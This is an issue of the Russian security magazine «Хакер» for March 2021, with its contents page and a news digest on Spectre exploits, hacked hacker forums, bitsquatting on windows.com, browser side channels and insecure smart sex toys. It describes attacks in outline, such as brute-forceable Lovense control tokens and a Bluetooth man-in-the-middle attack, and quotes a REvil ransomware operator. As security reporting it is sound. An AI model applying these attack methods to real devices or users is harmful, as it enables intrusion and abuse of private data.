
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                  Март 2021
            № 264
CONTENTS

    MEGANews
  Са мые важные события в мире инфо сека за март

     Android
  Реверс-инжи ниринг Flutter-приложения

    NFT — это скам!
  Как торговля циф ровым искусством захватила умы и что из этого выйдет

    Кот атакует!
  Изучаем откры тый стилер StormKitty

    HTB CrossFit
  Раскручиваем слож ную XSS, чтобы захватить хост

    Препарируем TypeLibrary
  Реверсим код с ActiveX и OLE Automation

    ProxyLogon
  Как работа ет уязвимость в Microsoft Exchange Server и как ее используют хакеры

    HTB Luanne
  Эксплуатируем Lua, что бы захватить машину с NetBSD

    Пешком по Firebase
  На ходим откры тые базы дан ных, которые пря чет Google

    Матрица ATT&CK
  Как устроен язык опи сания угроз и как его используют

    Дробью в PDF
  Редак тируем под писан ный файл PDF, не ломая под писи

    HTB Time
  Захватыва ем машину с Linux через уязвимость в парсере JSON

    YOLO!
  Исполь зуем нейросеть, чтобы следить за людьми и разгадывать капчу

    SSH по-крупному
  Исполь зуем удос товеря ющий центр SSH, чтобы облегчить жизнь админу

    Контейнерно-модульное тестирование
  Пишем юнит-тес ты для обра зов Docker

    Путь отказа
  Ка ких фич мы лишились в современ ных смартфо нах

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: Роскомнадзор замедлил Twitter в России,
в сети найдены «боевые» экспло иты для уязвимости Spectre,
хакерские форумы стра дают от взло мов и утечек, компании
несут  миллиардные  убытки   из‐за  кибератак,  а   в
секс‐игрушках опять обнаружили мно жество уязвимостей.





ЭКСПЛОИТЫ
ДЛЯ SPECTRE
Французский ИБ‐специалист Жюль ен Вуазен (Julien Voisin) обнаружил, что
в начале февраля 2021 года некто загрузил на VirusTotal эксплоиты для уяз‐
вимости Spectre (CVE‐2017‐5715). Это первый слу чай, когда «боевой» экспло‐
ит для данной проб лемы стал дос тоянием общественности.


             INFO

                    Оригинальная проблема Spectre была найдена
                        в 2018 году наряду с багом Meltdown. Эти фун‐
                     даментальные  недостатки  в  архитектуре  сов‐
                     ременных   процессоров   позволяют    легко
                      нарушить  изоляцию  адресно го  пространства,
                      прочитать пароли, ключи шифрования, номера
                      банковских  карт,  произвольные  данные  сис‐
                      темных и других пользовательских приложений
                        в обход любых средств защиты и на любой ОС.
                     Фактически  три  года  назад  эти  проблемы
                      вынудили производите лей процессоров перес‐
                       мотреть подход к проекти рованию CPU, ясно дав
                         понять,  что  нельзя  сосредотачиваться  лишь
                       на производительности в ущерб безопасности.


В 2018 году, вско ре после обнаружения Meltdown и Spectre, ИБ‐специалисты
отмечали, что авторы вредоносных прог рамм активно экспериментируют
с этими уязвимостями, а в сети в целом и на VirusTotal в частности можно
было найти сле ды этой деятельности. Но тогда все это ни к чему не при вело,
и в реальности так и не было найдено никаких доказательств эксплуатации
обеих уязвимостей.
   Теперь же, по данным Вуазена, все изменилось. Он нашел новые,
отличные от пре дыдущих экс пло иты для Spectre — один для Windows и один
для Linux. В частности, версия для Linux спо соб на сделать дамп содержимого
файла /etc/shadow, в котором хранятся сведения об учетных записях поль‐
зователей ОС. Это определенно вредоносное поведение, однако пока нет
никаких доказательств того, что сам экс плоит применял ся на практике, а не
был загружен на VirusTotal каким‐то пентестером.
  В своей статье Вуазен намекнул, что он понял, кто мог стоять за соз дани‐
ем этих эксплоитов. По его сло вам, атрибуция в данном слу чае весьма три‐
виальна и читатели блога смогут догадаться обо всем самостоятельно.
ИБ‐эксперты в Twitter и на HackerNews провели собственный анализ и быстро
поняли, что новый эксплоит для Spectre может быть модулем для пентестер‐
ского инструмента CANVAS, разработанного Immunity Inc. На это же в Twitter
намекнул и бывший глава Immunity Дэйв Айтель, отмечая, что компания рек‐
ламировала этот модуль еще в феврале 2018 года.





Как стало известно СМИ, недавно на хакерском форуме RAID была опуб‐
ликована взломанная версия Immunity CANVAS v7.26, а также взломанные
копии White Phosphorus и D2 (два пакета рас ширений для CANVAS, содер‐
жащие наборы эксплоитов для раз личных уяз вимос тей). Среди тех уяз вимос‐
тей был и эксплоит для проблемы CVE‐2017‐5715.
  Известно, что взломанные версии это го инстру ментария распространяют‐
ся в частных Telegram‐каналах по меньшей мере с октября 2020 года. Судя
по всему, именно они послужили источником эксплоитов,  загруженных
на VirusTotal.
   Также стоит сказать, что в этом месяце инженеры Google опубликовали
собственный JavaScript‐экспло ит, который демонс трирует эффективность
использования уязвимости Spectre в браузерах для доступа к информации
в памяти. Этот PoC‐эксплоит работает с широким спектром архитектур, опе‐
рационных систем и поколений обо рудования. Он на практике доказы вает,
что защитные механизмы, которые раз работчики добавили в свои браузеры
(например, изоляция сайтов, Cross‐Origin, Cross‐Origin Read Blocking и так
далее), фактически не работают.
  В Google считают, что раз работчики должны использовать для защиты
от Spectre и других cross‐site‐атак новые механиз мы безопасности. Помимо
стандартных средств защиты, таких как X‐Content‐Type‐Options и X‐Frame‐Op‐
tions, в Google рекомендуют применять:
 • Cross‐Origin Resource Policy (CORP) и Fetch Metadata Request Headers;
 • Cross‐Origin Opener Policy (COOP);
 • Cross‐Origin Embedder Policy (COEP).


ВЫМОГАТЕЛЬСТВО НА 500 БИТКОЙНОВ

Разработчики криптовалюты Tether (USDT) предуп редили, что неизвес тные лица вымогали у них
500 биткойнов (при мерно 24 000 000 долларов по курсу на тот момент). В случае если ком‐
пания откажется платить, мошенники обещали обнародовать яко бы похищенные у нее данные.


Хотя в Twitter распространялись скрин шоты якобы украден ных у Tether дан ных, в компании
заявили, что эта утечка — фейк, а документы, которые выкладывают преступники, подделка.





ЗАМЕДЛЕНИЕ
TWITTER
С 10 марта 2021 года работа  Twitter на территории России замедлена
на 100% с мобильных устройств и на 50% со стационарных устройств
по решению Роскомнадзора. Это связано с тем, что, по утверждениям пред‐
ставителей ведомства, «Twitter в период с 2017 года по настоящее вре мя
не удаляет контент, склоняющий несовершеннолетних к совершению само‐
убийств,  содер жащий  детскую  порногра фию,  а  также  информацию
об использовании наркотических средств». Замедление не будет ограничи‐
вать передачу текстовых сообщений, а зат рагивает только фото‐ и видеокон‐
тент.
  Напомню, что с 1 февраля 2021 года всту пил в силу закон, согласно
которому социальные сети должны самос тоятель но выявлять и блокировать
запрещенный контент, и в начале марта Роскомнад зор обви нял  Twitter
в «злостном нарушении российско го законодательства».
  Представите ли Роскомнадзора подчеркну ли, что с 2017 года по нас‐
тоящее время направили свыше 28 тысяч первоначальных и повторных тре‐
бований  об  удалении  противоправных  ссылок  и  публикаций,  одна‐
ко 3168 материалов с зап рещен ной информацией так и не были удалены. «В
том числе 2569 с призывами к совершению суици да несовершеннолетними,
450 с детской пор нографией, 149 с информацией об использовании нар‐
котиков».
   Хотя в ведомстве говорили, что так и не дождались никакого отве та
от социальной сети, предста вители  Twitter распространили в СМИ сле‐
дующее заявление:



     «Нам извес тно о том, что Twitter в Рос сии под вер гся намеренному
      замед лению (мас штабному и бес порядоч ному) из‑за бес покойства
      по поводу уда ления контента. Давайте проясним: мы придер жива емся
      политики абсолютной нетер пимос ти в отношении сек суальной экс плу-
      ата ции  детей, а поощ рение, вос хва ление самоубийств и чле нов-
      редительства и под талки вание к ним прямо противоречит пра вилам
        Twitter, и мы зап реща ем использовать Twitter для любых противоп-
      равных действий и незаконной деятельнос ти, в том чис ле для покуп ки
      и продажи нар котиков. Мы по‑прежнему являемся привер женца ми
      откры того интерне та для все го мира и глу боко обес покоены учас-
      тившимися  попытками  заблокировать  и  огра ничить  публичные
      обсужде ния в интерне те».

Несколько дней спустя в беседе с журналистами ТАСС замес титель главы
ведомства Вадим Субботин сообщил, что Рос комнадзор может рас смотреть
возможность полной бло кировки сервиса:



     «Мы взяли месяц и наблюда ем за реак цией ком пании Twitter по воп-
      росу уда ления зап рещенной информа ции. Пос ле чего, в зависимос ти
      от действия админис тра ции социальной сети, будут приняты соответс-
       тву ющие решения. Если Twitter не исполнит тре бова ния Рос комнад-
       зора,  тре бова ния  рос сийского  законодательства,  соответс твенно,
      будем рас сматривать воп рос о полной блокиров ке сер виса на тер-
      ритории Рос сии».

В конце марта на сайте Роскомнад зора появи лось новое сообщение,
которое гласит, что «темпы удаления зап рещенной информации в Twitter
остаются неудовлетворительными». По данным властей, социальная сеть
начала работу по удалению контента, но «фактичес ки удалена только треть
запрещенного в России контента с дет ской порнографией, материалов,
склоняющих детей к суициду, рекламирующих приобретение, изготовление
и употребление наркотиков».


ИНТЕРВЬЮ UNKNOWN
Представитель хак‐группы, стоящей за извес тным шифровальщиком REvil (он же Sodinokibi),
дал интервью изданию The Record. Человек, извес тный под ником Unknown, рассказал, что
у группировки большие пла ны на 2021 год, а также заметил, что «денег никогда не бывает
слишком много».





→«Лично для меня нет потолка суммы. Я просто люблю это делать и получать от это го при‐
быль. Денег никогда не быва ет слишком много, зато всегда есть риск, что их не хватит».
О сумме, которая заставила бы его отойти от дел.

→«Как оружие [шифровальщики] могут быть крайне разрушительными. Ну, я знаю, что
по крайней мере несколько наших клиентов имеют дос туп к сис теме запус ка бал листичес ких
ракет, еще один — к крейсеру ВМС США, второй — к атомной электрос танции, а тре тий — к ору‐
жейному заводу. Вполне реально развязать войну. Но оно того не стоит — пос ледствия
невыгодны».
О потенциале шифровальщиков как оружия в кибервойне.

→«Кризис ощутимый, [жертвы] не могут платить те сум мы, которые были раньше. За исклю‐
чением производителей фармацевтической продукции. Думаю, на них стоит обращать больше
внимания. У них все в поряд ке. Нам стоит им „помочь“».
О том, как изменилась ситуация во время пан демии.

→«В детстве я рылся в помойках и курил окурки. Я ходил десять километров в одну сторону
до школы. Я носил одну и ту же одежду по шесть месяцев. В юнос ти, в коммуналке, я не ел
по два, а то и по три дня. А теперь я миллионер».





ХАКЕРЫ ХАКАЮТ
ХАКЕРОВ
Maza
Специалисты компании Flashpoint обнаружили утечку данных с закрытого рус‐
скоязычного хак‐форума Maza (он же Mazafaka). Форум — один из старейших
в своем роде и работает с 2003 года. Как пишут эксперты, его основной кон‐
тингент — это «самые изощренные киберпрес тупники и финансовые мошен‐
ники, многие из которых начали свою деятельность еще в середине — кон‐
це 1990‐х годов».
  О злоумышленниках, которые скомпрометирова ли Maza, ничего не извес‐
тно. После успешного взло ма они опуб ликовали на форуме предупрежде ние,
гласящее: «Этот форум был взло ман. Ваши данные были пропущены». Оче‐
видно, русский язык не родной для ата кующих, а сообщение прогнали через
онлайн‐переводчик. Сообщается, что утекли данные примерно 3000 поль‐
зователей.
  Судя по всему, с форума утекли идентифика торы пользователей, имена
пользователей, адреса электронной почты, ссылки на мессенджеры, в том
числе Skype, MSN и Aim, а также пароли, как хешированные, так и обфусци‐
рованные. При этом в теме обсуждения взлома некоторые пользователи
заявляют, что была похищена лишь старая БД, тогда как дру гие пишут, что
намереваются уйти на другой форум.
  Эксперты Flashpoint отмечают, что известие о взломе Maza пришло вскоре
после успешной компромета ции другого русскоязычного хак‐форума, Veri‐
ﬁed, который  взломали 20 января 2021  года. Пос ле  этого, 18 фев‐
раля 2021 года, новые администраторы Veriﬁed объявили о смене владельца
ресурса и начали процесс деано нимизации предыдущих опе раторов Veriﬁed,
известных под никами INC, VR_Support и TechAdmin. Новые админис траторы
заявили, что пре дыдущие владельцы сай та регистрировали IP‐адре са всех
пользователей Veriﬁed и в общей сложности соб рали 3 801 697 адресов.
  Пока неизвестно, будут ли взломщики Maza предпринимать аналогичные
действия по захвату форума. Дело в том, что упомянутый выше администра‐
тор INC является (или рань ше был) модера тором Maza.


Carding Mafia
Специалисты агрегатора утечек Have  I Been Pwned (HIBP) сообщили, что
в сеть попали данные пользователей извес тно го кардерского форума Carding
Maﬁa.
  Похоже, форум был взломан, и в результате в открытый доступ просочи‐
лась информация о 297 744 пользователях (суммарно пользовательская база
ресурса насчитывает около 500 тысяч человек). По информации HIBP, дамп
вклю чает в себя email‐адреса, IP‐адреса, имена поль зователей и хеширован‐
ные пароли (MD5).
  Основатель Have I Been Pwned Трой Хант пишет, что ему уже удалось под‐
твердить подлинность дампа. Специалист заметил в утекшей базе email‐
адреса Mailinator, службы, которая позволяет любому создавать одноразовые
почтовые ящики. Хант использовал эти адреса на форуме, задействовав фун‐
кцию «Я забыл пароль», и адреса оказались зна комы Carding Maﬁa, то есть
использовались для создания учетных записей на форуме.



     «Еще одна история о том, как хакеры хака ют хакеров», — проком-
      ментировал Хант.

Журналисты издания Vice Motherboard отмечают, что в январе текуще го года
на другом хакерском форуме уже публиковались данные, предположительно
украденные у Carding Maﬁa. То есть, вероятно, утечка могла произой ти
еще тогда.


ИТ‐ШНИКИ ВЫНУЖДЕНЫ МОЛЧАТЬ
Эксперты «Лаборатории Касперского» провели опрос, в котором приняли учас тие 5266 IT‐спе‐
циалистов из 31 страны, включая Россию, и подсчитали, что две тре ти российских IT‐компаний
запрещают своим аналитикам делиться данными о киберуг розах с про фессиональным сооб‐
ществом.

В России 68% аналитиков киберугроз сос тоят в профес сиональных сообществах. Но делиться
результатами своих исследований с коллегами по индус трии не могут 69% таких сот рудников
из сферы IT и кибербезопасности: это зап рещено правилами компании.

Чаще всего аналитики общаются на специализиро ван ных форумах и  в бло гах  (55%),
на теневых форумах (26%) и в группах в соцсетях (14%). Но только каж дый пятый спе циалист
(19%) делится своими находками.

Если правила компании допускают обмен такой информацией с сообществом, то это делает
почти каждый второй (49%), если же нет, то лишь око ло 5% нарушают запрет.





БОТНЕТ FLUBOT
Власти  Барселоны  сооб щили  о  задержании  четырех  подоз реваемых
в управлении Android‐ботнетом FluBot, который уже заразил больше 60 тысяч
устройств, причем 97% жертв находились в Испании.
   FluBot представляет собой банковский троян, который способен показы‐
вать фейковые экраны логина поверх дру гих приложений. Таким образом
вредонос собирает учетные данные от электронного банкинга и данные пла‐
тежных карт сво их жертв. Впервые FluBot был замечен экспертами компании
ThreatFabric в начале текущего года, а недавно аналитики швейцарской фир‐
мы PRODAFT подготовили подробный отчет об этой мал вари. Похоже, имен‐
но собранные экспертами данные и привели к аресту операторов мал вари.
   Внушительное количество заражений FluBot объясняется наличием в его
коде червеобразного механизма, благода ря которо му злоумышленники мог‐
ли загрузить адресную книгу жертвы на свой управляющий сервер и рас‐
сылать оттуда вредоносный SMS‐спам. Такие SMS‐сообщения содержат раз‐
личные приманки, чтобы зас тавить получа теля перейти по ссылке. Ссылки
обычно ведут на взло манные сайты, где операторы FluBot размещают свою
мал варь, скрытую внутри APK‐файлов.
   Аналитики PRODAFT предупреждали, что с зараженных устройств было
собрано больше 11 миллионов телефонных номеров (это почти 25% всего
населения Испании), а каталонские официальные лица говорят, что отсле‐
дили не менее 71 тысячи спам‐сообщений, отправленных группой.
  Испанские правоох ранители сообщают, что ими были задержаны четверо
мужчин в возрасте от 19 до 27 лет, чьи имена не раз глашаются. Двое из них
считаются лидерами группировки и оставлены под стражей, тогда как еще
двое были отпущены на свободу, но обязаны явиться в суд. Похоже, один
из лидеров хак‐группы отвечал за техничес кую сторону операций FluBot,
написал малварь и создавал фальшивые стра ницы логина для имитации раз‐
личных банкингов.
  Следователи также про вели обыски в квартирах подозреваемых, где изъ‐
яли наличные, ноутбуки, документы и мобильные устройства. Якобы некото‐
рые из этих мобильных устройств были куп лены на деньги пострадавших.
  Несмотря на эти арес ты, FluBot по‐прежнему активен и продол жает рас‐
пространяться. Пока неяс но, остались ли на свободе другие члены группы,
руководящие ботнетом, или управляющие серверы вре доноса работают
автоматически и сейчас ботнет функционирует «по инерции».


URSNIF АТАКОВАЛ 100 БАНКОВ
Банковский троян Ursnif продолжает атаковать пользователей по все му миру. Уже несколько
лет он распространяется через фишинговые письма, написан ные на разных языках. Тро ян
не только способен похищать банковские данные, но и может получить доступ к элек тронным
письмам и браузерам жертвы, а также добраться до крип товалютного кошелька.


По данным компании Avast, в последнее время главной целью Ursnif стали итальянские банки
и их клиенты: злоумышленники атаковали пользователей более 100 банков и похитили более
1700 учетных данных только для одного опе ратора платежей.





                                     Продолжение статьи →
← Начало статьи





 БИТСКВОТТИНГ
 И WINDOWS.COM
  Независимый ИБ‐специалист, известный как Рэми (Remy), обнаружил, что
  домены Microsoft не защищены от битс квоттинга. Эксперт проводил свои
  эксперименты на примере домена windows.com, который может превратить‐
   ся, например, в windnws.com или windo7s.com в случае переворота битов.


               INFO

                         Термином  битсквот тинг   (англ.   Bitsquatting)
                         обозначают   разновидность   киберсквоттинга,
                           которая  предлагает  использовать  различные
                         вариации  легитимных доменов  (обычно  отли‐
                       чающиеся от оригинала на 1 бит). Использование
                          битсквоттинговых доменов обычно происходит
                           автоматически, когда с компьютера, на котором
                         произошел переворот битов, делается DNS‐зап‐
                            рос.


  Фундамент исследования Рэми строится на том факте, что вся информация,
  по сути, состоит из нулей и единиц и то же самое касается доменов.
  Как известно, биты могут переворачиваться (0 превращается в 1 или наобо‐
   рот), реагируя на космическое излучение, колебания мощности, температуры
  и так далее. Причем в 2010 году ИБ‐эксперты уже выяс няли, что на компьюте‐
  ре с 4 Гбайт оперативной памяти есть 96%‐й шанс переворота битов
   в течение трех дней.



         «Теперь пред положим, что компьютер слиш ком сильно нагрева ется,
        произош ла солнечная вспыш ка или кос мичес кий луч (совер шенно
         реальная шту ка) перевер нул биты на компьюте ре, — пишет Рэми. —
      О нет! Теперь в памяти хра нится зна чение whndows.com, а не win-
         dows.com! Что же произойдет, когда придет вре мя уста новить соеди-
        нение с этим доменом? Домен не соответс тву ет IP-адре су».

  В итоге Рэми составил список доменов, которые могут образоваться из‐за
  перевернутых битов. Он обнаружил 32 действительных доменных имени,
  14 из которых не были зарегистрирова ны и ока зались доступны для захвата.





         «Это весьма странный слу чай, пос кольку обыч но ком пании, подобные
          Microsoft, выкупа ют такие домены, чтобы пре дотвра тить их исполь-
         зование фишера ми. Поэтому я купил их. Все. Пример но за 126 дол-
         ларов», — рас ска зыва ет иссле дова тель.

  Купленные Рэми домены: windnws.com, windo7s.com, windkws.com, windmws.‐
  com,  winlows.com,  windgws.com,  wildows.com,  wintows.com,  wijdows.com,
  wiodows.com, wifdows.com, whndows.com, wkndows.com, wmndows.com.
     Возможно, эта проб лема может показаться чисто теоре тической, однако
  ИБ‐эксперты не раз сообщали об успешном практическом при менении таких
   атак. К примеру, на Black Hat 2011 был представлен доклад под наз ванием
   «Bit‐squatting DNS Hijacking without Exploitation», в котором исследователь
  рассказывал, как он захватил 31 вариант для вось ми легитимных доменов
  нескольких организаций. И в среднем он нас читал 3434 ежедневных DNS‐
  запроса к этим доменам.
     Теперь Рэми проделал то же самое для windows.com. В допол нение к тра‐
   фику, предназначенному для windows.com, исследователь смог перехватить
  UDP‐трафик, предназначенный time.windows.com, а также TCP‐трафик, адре‐
  сованный различным службам Microsoft, включая Windows Push Notiﬁcation
   Services (WNS) и SkyDrive (бывшее название OneDrive).



        «Неудивительно, что служба NTP, которая работа ет на всех Windows-
        компьюте рах в мире с конфигура цией по умолчанию, использующей
         time.windows.com, генерирует наибольший тра фик для перевер нутых
         битов, — пишет Рэми. — Но все рав но у меня было много и дру гого
         тра фика».

  Исследователь пишет, что сама возможность битс квоттинга — это очень тре‐
  вожный знак, потому что таким обра зом злоумыш ленники могут соз дать мно‐
  жество проблем для безопасности приложений.
    Помимо трафика, возникающего из‐за перевернутых битов, Рэми обна‐
   ружил, что немалое количес тво зап росов, похоже, исходит от пользователей,
  неправильно вводящих доменные имена. Однако понять, какой именно про‐
  цент запросов происходит от опечаток, не представляется возможным:


         «К сожале нию, из‑за природы битс квоттинга нет никакого способа
        проверить,  что  это  не  орфогра фичес кие ошибки.  Единс твенная
        информа ция, дос тупная для иссле дова ния, —  та, что отправ ляется
        вмес те с зап росом (нап ример, заголовок рефере ра и дру гие заголов-
           ки)».

  Защищаться от битсквоттинговых атак эксперт предлагает нес колькими спо‐
  собами. К примеру, компании могут регистрировать домены, которые могут
  использоваться для битсквот тинга. Чаще всего так и происходит. Например,
   time.apple.com защищен от подобных атак, в отличие от time.windows.com.
   Также Рэми упоминает ECC‐память, которая может помочь защитить компь‐
  ютеры и мобильные девайсы от проб лемы переворота битов.
     Представите ли Microsoft сообщили СМИ, что им «известны обще отрасле‐
  вые методы социальной инженерии, которые могут использоваться для нап‐
  равления клиентов на вредоносные сайты» и посоветовали пользовате лям
  «проявлять осторожность при переходе по ссылкам, открытии неиз вестных
  файлов или принятии передачи файлов».


  TELEGRAM ПРОДАЛ ОБЛИГАЦИИ
  В этом месяце компания Telegram успешно продала инвесторам со всего мира облигации мес‐
   сенджера общей стоимостью более 1 миллиарда дол ларов. Павел Дуров обе щал, что эти
   средства поспособствуют глобальному росту Telegram, позволяя ему сохранить свои ценности
   и независимость. Теперь же он поясняет, что облигации Telegram Group не помогут владельцам
   влиять на политику мессенджера и принимать какие‐либо решения о его раз витии.





  →«Владение облигациями не является каким‐либо значимым рычагом давления, равно как и
   „дружба“ с кем‐то, кто вла деет облигациями. Облигации Telegram — прос то форма дол га,
   которую любой инвестор теперь может приобрести на вторичном рынке. Ни один из этих
   инвесторов не получает никаких прав на управление Telegram или влияние на его политику.
     Выпуск облигаций сильно отличается от продажи акций, при которой инвесто ры получают
   голосующие акции, места в совете директоров и так далее».





 СЛЕЖКА
 БЕЗ JAVASCRIPT
  Группа уче ных из Университета Бен‐Гури она (Изра иль), Университета Аде‐
  лаиды (Австралия) и Университета Мичигана (США) представила исследова‐
   тельскую работу под названием «Prime+Probe 1, JavaScript 0: Overcoming
  Browser‐based Side‐Channel Defenses», пос вященную атакам по стороннему
   каналу (side‐channel) с использованием браузеров.
    В своем докладе исследова тели демонстрируют, что side‐channel‐атаки
  на браузеры по‐прежнему возможны, нес мотря на все усилия производите‐
  лей и все меры по их устра нению. Хуже того, подобные атаки работают даже
   в  защищенных  браузерах,  ориентированных  на  конфиденциальность,
  которые были специально защищены от атак типа Spectre, включая браузер
   Tor, Chrome с расширением Chrome Zero и Firefox с расширением DeterFox.
     Эксперты пишут, что даже при пол ностью отклю ченном JavaScript атака
  по стороннему каналу, основанная исключитель но на HTML и CSS, тоже
  может привести к утечке достаточного количества данных из браузера. Такой
   утечки (даже без JS) хватит для того, чтобы с чуть меньшей точностью иден‐
  тифицировать и отслеживать пользователей, определяя, к при меру, какие
  сайты посещал человек.
    При этом в док ладе подчеркивается, что ата ки были протестированы
  не только против браузеров, работающих в системах на процессорах Intel
  (которые в прошлом чаще всего ока зыва лись уяз вимы для атак по сторонним
   каналам), но и против бра узеров, работа ющих в системах с процессорами
  Samsung Exynos, AMD Ryzen и даже новым чипом M1 от Apple. В итоге данное
  исследование стало первым случаем, когда side‐channel‐атака сработала
  против Apple M1.





  Эксперты говорят, что уведомили инженеров  Intel, AMD, Apple, Chrome
  и Mozilla о своих выводах еще до пуб ликации исследовательской работы,
  однако не сообщается, какие ответы были получены от производите лей.
    Интересно, что недавно раз работчики Google Chrome признавали, что,
  даже невзирая на новую функцию Site Isolation, атаки по сторонним каналам
   в современных браузерах невозможно заблокировать полностью. Также
  инженеры Google говорили о том, что side‐channel‐атаки вскоре перестанут
  нуждаться в JavaScript и будут осуществляться толь ко с помощью CSS. Чтобы
  защититься от таких проблем, они призвали раз работчиков перес мотреть
  подход к созданию сайтов и обработке данных.


 МИЛЛИАРДЫ УБЫТКОВ ИЗ‐ЗА ХАКЕРОВ
  ФБР опубликовало ежегодный отчет о прес туплениях в интернете. По данным правительства
  США, 2020 год стал рекордным по количеству киберпреступлений.

  В прошлом году ФБР получило 791 790 жалоб на различные киберпреступления, что на 69%
   больше 467 361 жалобы, полученной правоохранителями в 2019 году.

  Общие потери пострадавших тоже возросли: за прошедший год жертвы сообщили о потере
   средств на сумму более 4,2 миллиарда долларов, что на 20% больше, чем в 2019 году, ког‐
   да пострадавшие сообщали о потерях в размере 3,5 миллиарда долларов.





   Как и в предыдущие годы, наиболь шее чис ло проблем было связано с так называемым EAC‐
   и BEC‐скамом (Email Account Compromise и Business Email Compromise). Такие афе ры стали
   причиной убытков в размере 1,8 миллиарда дол ларов, что составило око ло 43% от всех
   потерянных средств за прошлый год.

   Также на 225% возросло количество вымогательских атак, а убыт ки от таких преступлений
   превысили 29,1 миллиона долларов, против 8,9 миллиона дол ларов в 2019 году.





 ОПАСНЫЕ
 СЕКС‐ИГРУШКИ
  Аналитики ESET Дениз Джусто Билич (Denise Giusto Bilić) и Сесилия Пас‐
  торино (Cecilia Pastorino) изу чили несколько умных устройств для взрос лых
  и пришли к выводу, что с точки зрения безопас ности, к сожалению, даже
  новые модели таких девайсов по‐прежнему представляют собой весьма
  печальное зрелище.
    Основное беспокойство исследова телей связано с тем, что носимые
  устройства и «умные» секс‐игрушки оснащены многочис ленны ми функциями,
  вклю чая доступ в интернет и поддержку Bluetooth, доступ к онлайн‐конферен‐
  циям и мессендже рам. Все это откры вает большие воз можнос ти для зло‐
  умышленников, желающих атаковать подобные девай сы.





   Так, большинство умных устройств имеют два основных канала связи. Связь
  между пользователем смартфона и самим устрой ством осу ществляется
  через Bluetooth Low Energy (BLE), когда пользователь запус кает приложение
   секс‐игрушки. Тогда как связь между уда ленным сексуальным партнером
  и приложением, управляющим устройством, устанавливается через интернет.
     Для реализации этих функций умные секс‐игрушки, как и любое другое
   IoT‐устройство, используют API‐эндпой нты, обра баты вающие запросы.



        «В некоторых слу чаях эта облачная служба так же выс тупа ет в качес тве
         пос редника  между  пар тне рами,  использующими  такие  функции,
          как чат, виде оконференц связь и переда ча файлов или даже пре дос-
         тавле ние уда ленного управле ния устройством пар тне ру», — гла сит
          отчет.

  При этом информация, обрабатываемая секс‐игрушками, состоит из крайне
  конфиденциальных данных, вклю чая имена людей, их сексуальную ориента‐
  цию, пол, список сексуальных партнеров, личные фотографии, видео и так
   далее. Словом, это настоящий кладезь данных для злоумышленников, нап‐
  ример занимающих ся «сексуальным вымогательством» — sextortion (термин
  образован от слов sex — «секс» и extortion — «вымога тельство»).
     Хуже  того, подоб ные  IoT‐устройства могут быть скомпрометированы
  и использованы для вредонос ных действий, вклю чая нанесение физического
  вреда пользователю. Такое может произой ти, например, при перегреве
   секс‐игрушки.


        «И  наконец,  что произойдет, если  кто‑то  возь мет под  контроль
         секс‑игрушку без согласия пользовате ля, пока та используется, и ста-
         нет посылать этому устройству раз личные команды? Считается ли ата-
         ка на секс‑устройство сек суальным насилием и может ли подобное
        привес ти  к обвинениям в сек суальном насилии?» — раз мышляют
         иссле дова тели.

  Чтобы продемонстрировать опас ность подоб ных недостатков безопасности,
  исследователи провели собственные тес ты секс‐игрушек Max от Lovense
  и We‐Vibe Jive. Быстро выяснилось, что оба гаджета используют наименее
  безопасный метод соединения Bluetooth — Just Works.
    Используя фреймворк BtleJuice и два BLE‐донгла, эксперты сумели про‐
  демонстрировать, как зло умышленник может осуществить атаку типа man
   in the middle, захватить контроль над устройством и перехватить пакеты.
  Затем хакер может ретранслировать модифицированные пакеты, пред‐
  варительно изменив нас тройки, включая,  к примеру, режим вибрации
  и интенсивность или даже внедрив собс твенные команды.
     Хуже того, оказалось, что эндпойнты API, исполь зуемые для соединения
  удаленного партнера с пользователем, применяют токен, который можно
  подобрать с помощью простого брут форса.



        «Список опций приложе ния Lovense для уда ленного управле ния вклю-
         чает  в  себя  воз можность  соз дания  URL-адре сов  в  фор мате
          https://api2.lovense.com/c/, где используется ком бинация из четырех
         бук венно‑циф ровых сим волов, — гла сит отчет. — Это поз воляет поль-
         зовате лям уда ленно управлять девайсами, прос то вводя такие URL-
        адре са в бра узер. Удивительно, но сер вер не име ет никакой защиты
         от брутфорса, хотя здесь используются такие короткие токены с отно-
         сительно   небольшим   количес твом   воз можных   ком бинаций
          (1 679 616 воз можных токенов для приложе ния, нас читыва юще го
        более миллиона загрузок)».

   Также у устройств отсутс твуют сквозное шифрование и привязка сертифика‐
   тов, используемые при получении обновлений прошивки.



         «Это чрез вычайно серьезная уяз вимость, пос кольку она поз воляет
         злоумыш леннику  уда ленно  захватить  устройства  (без  согласия
        или ведома  пользовате ля), ожидающие под клю чения  с помощью
         активных токенов», — объясняют спе циалис ты.

  Еще прошлым летом исследователи уведоми ли разработчиков WOW Tech
  Group и Lovense о проблемах, которые им уда лось обнаружить. Уже
   в августе 2020 года вышла версия 4.4.1 приложения WOW Tech We‐Connect,
  которая содержала исправления для обна руженных уяз вимос тей, а также
  проблемы были устранены и в приложении Lovense с релизом версии 3.8.6.



         «Зачас тую   мобильные   приложе ния,   подобные   приложе ниям
         для  управле ния  секс‑игрушка ми,  обра баты вают  очень  ценную
        информа цию о своих пользовате лях. Крайне зна чимо, чтобы раз-
         работчики понима ли, как важно тра тить вре мя и усилия на раз работку
        и соз дание безопас ных сис тем, не под дава ясь дав лению рынка,
        который ста вит скорость выше безопас ности», — резюмируют авторы
         иссле дова ния.


  3 ГОДА ТЮРЬМЫ ДЛЯ ВЗЛОМЩИКА TWITTER

  В прошлом году 17‐летний Грэм Айвен Кларк aka Kirk взломал компанию Twitter. Взлом кос‐
   нулся 130 аккаунтов публичных людей, компаний, криптовалютных бирж, а для 45 из них были
   успешно сброшены пароли. Вскоре после атаки Кларк был арестован.


